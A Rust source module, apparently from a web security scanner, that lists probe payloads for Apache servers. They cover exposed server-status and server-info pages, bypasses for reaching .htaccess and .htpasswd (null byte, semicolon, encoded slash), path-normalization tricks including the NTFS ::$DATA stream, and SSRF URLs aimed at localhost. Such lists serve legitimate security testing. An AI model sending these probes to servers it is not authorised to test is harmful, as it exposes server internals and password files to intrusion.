use super::TargetPayload;

pub fn get_payloads() -> Vec<TargetPayload> {
    let mut payloads = Vec::new();

    payloads.extend(get_mod_status_payloads());
    payloads.extend(get_htaccess_bypass_payloads());
    payloads.extend(get_path_normalization_payloads());
    payloads.extend(get_ssrf_payloads());

    payloads
}

fn get_mod_status_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "/server-status".to_string(),
            description: "Apache server-status page".to_string(),
            category: "mod_status".to_string(),
        },
        TargetPayload {
            payload: "/server-status/".to_string(),
            description: "Server-status with trailing slash".to_string(),
            category: "mod_status".to_string(),
        },
        TargetPayload {
            payload: "/server-info".to_string(),
            description: "Apache server-info page".to_string(),
            category: "mod_status".to_string(),
        },
        TargetPayload {
            payload: "/server-info/".to_string(),
            description: "Server-info with trailing slash".to_string(),
            category: "mod_status".to_string(),
        },
        TargetPayload {
            payload: "/status".to_string(),
            description: "Generic status endpoint".to_string(),
            category: "mod_status".to_string(),
        },
    ]
}

fn get_htaccess_bypass_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "/protected/.htaccess".to_string(),
            description: "Direct .htaccess access".to_string(),
            category: "htaccess-bypass".to_string(),
        },
        TargetPayload {
            payload: "/protected/.htpasswd".to_string(),
            description: "Direct .htpasswd access".to_string(),
            category: "htaccess-bypass".to_string(),
        },
        TargetPayload {
            payload: "/protected/.htaccess%00".to_string(),
            description: "Null byte bypass".to_string(),
            category: "htaccess-bypass".to_string(),
        },
        TargetPayload {
            payload: "/protected/.htaccess/".to_string(),
            description: "Trailing slash bypass".to_string(),
            category: "htaccess-bypass".to_string(),
        },
        TargetPayload {
            payload: "/protected/..;/".to_string(),
            description: "Semicolon bypass".to_string(),
            category: "htaccess-bypass".to_string(),
        },
        TargetPayload {
            payload: "/protected%2f".to_string(),
            description: "Encoded slash bypass".to_string(),
            category: "htaccess-bypass".to_string(),
        },
    ]
}

fn get_path_normalization_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "/path/./to/./file".to_string(),
            description: "Self-referencing path segments".to_string(),
            category: "path-normalization".to_string(),
        },
        TargetPayload {
            payload: "/path/to/../to/file".to_string(),
            description: "Back and forth traversal".to_string(),
            category: "path-normalization".to_string(),
        },
        TargetPayload {
            payload: "/path%2fto%2ffile".to_string(),
            description: "URL encoded slashes".to_string(),
            category: "path-normalization".to_string(),
        },
        TargetPayload {
            payload: "/path%5cto%5cfile".to_string(),
            description: "URL encoded backslashes".to_string(),
            category: "path-normalization".to_string(),
        },
        TargetPayload {
            payload: "/path/to/file.".to_string(),
            description: "Trailing dot".to_string(),
            category: "path-normalization".to_string(),
        },
        TargetPayload {
            payload: "/path/to/file::$DATA".to_string(),
            description: "NTFS alternate data stream".to_string(),
            category: "path-normalization".to_string(),
        },
    ]
}

fn get_ssrf_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "http://127.0.0.1/server-status".to_string(),
            description: "SSRF to server-status".to_string(),
            category: "ssrf".to_string(),
        },
        TargetPayload {
            payload: "http://localhost/server-status".to_string(),
            description: "SSRF localhost to server-status".to_string(),
            category: "ssrf".to_string(),
        },
        TargetPayload {
            payload: "http://[::1]/server-status".to_string(),
            description: "IPv6 localhost SSRF".to_string(),
            category: "ssrf".to_string(),
        },
    ]
}
